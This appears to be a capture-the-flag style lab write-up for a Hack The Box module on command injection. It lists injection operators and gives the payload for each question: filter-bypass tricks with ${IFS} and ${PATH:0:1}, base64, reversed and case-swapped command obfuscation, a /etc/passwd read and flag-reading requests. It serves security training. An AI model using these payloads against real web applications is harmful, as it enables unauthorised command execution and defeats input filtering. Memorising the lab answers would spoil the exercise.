# [HTB] Command Injections
## Command Injection Methods
## To inject an additional command to the intended one, we may use any of the following operators:

##  Injection Operator	Injection Character	URL-Encoded Character	Executed Command

```Semicolon	      ;	         %3b	      Both```

```New Line	      \n         %0a	      Both```

```Background	      &	         %26	        Both (second output generally shown first)```

```Pipe	              |	          %7c	        Both (only second output is shown)```

```AND	              &&	  %26%26	    Both (only if first succeeds)```

```OR	              ||	  %7c%7c	    Second (only if first fails)```

```Sub-Shell	      ``	  %60%60	    Both (Linux-only)```

```Sub-Shell	     $()	   %24%28%29	  Both (Linux-only)```

## Other Injection Operators

>**Q. Try using the remaining three injection operators (new-line, &, |), and see how each works and how the output differs. Which of them only shows the output of the injected command?**

```sh
ip=127.0.0.1|ls
```

## Identifying Filters

>**Q. Try all other injection operators to see if any of them is not blacklisted. Which of (new-line, &, |) is not blacklisted by the web application?**

```sh
ip=127.0.0.1%0als
```

## Bypassing Space Filters

>**Q. Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?**

```sh
ip=127.0.0.1%0a{ls,-la}
```

## Bypassing Other Blacklisted Characters

>**Q. Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?**

```sh
ip=127.0.0.1%0a${IFS}ls%09${PATH:0:1}home
```

## Bypassing Blacklisted Commands

>**Q. Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.**


```sh
ip=127.0.0.1%0a${IFS}c"a"t%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```

## Advanced Command Obfuscation

>**Q. Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1**

```sh
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
```
```
[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
```
[/htb]$ $(rev<<<'imaohw')
```
```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```
```
$(rev<<<'imaohw') 
(([/htb]$echo 'whoami' | rev))
```
```
[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
```
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```
```
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```
```
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA

PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```
```
[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

```
```sh
ip=127.0.0.1%0abas$@h<<<$(ba$@se6$@4${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

## Skills Assessment

>**Q. What is the content of '/flag.txt'?**

```sh
/index.php?to=&from=51459716.txt%09${PATH}&finish=1&move=1
/index.php?to=&from=51459716.txt%26l's'${IFS}%09${PATH:0:1}&finish=1&move=1
/index.php?to=&from=51459716.txt%26c"a"t${IFS}%09${PATH:0:1}flag.txt&finish=1&move=1
```
